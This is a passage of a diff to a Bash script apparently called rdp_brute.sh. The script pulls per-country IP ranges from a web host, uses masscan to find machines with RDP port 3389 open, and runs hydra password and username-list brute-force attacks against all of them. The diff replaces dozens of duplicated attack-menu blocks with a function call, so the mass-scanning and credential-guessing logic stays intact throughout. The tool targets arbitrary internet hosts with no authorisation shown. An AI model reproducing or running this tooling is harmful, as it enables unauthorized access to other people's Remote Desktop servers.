-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "168" ]; then
 curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -28030,6 +11189,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28039,53 +11199,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "169" ]; then
@@ -28102,6 +11216,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28111,53 +11226,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "170" ]; then
@@ -28174,6 +11243,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28183,53 +11253,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "171" ]; then
@@ -28246,6 +11270,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28255,53 +11280,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "172" ]; then
@@ -28318,6 +11297,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28327,53 +11307,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "173" ]; then
@@ -28390,6 +11324,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28399,53 +11334,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "174" ]; then
@@ -28462,6 +11351,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28471,53 +11361,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "175" ]; then
@@ -28534,6 +11378,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28543,53 +11388,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -28607,6 +11406,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28616,53 +11416,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -28680,6 +11434,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28689,53 +11444,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "178" ]; then
@@ -28752,6 +11461,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28761,53 +11471,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "179" ]; then
@@ -28824,6 +11488,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28833,53 +11498,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "180" ]; then
@@ -28896,6 +11515,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28905,53 +11525,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -28969,6 +11543,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -28978,53 +11553,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
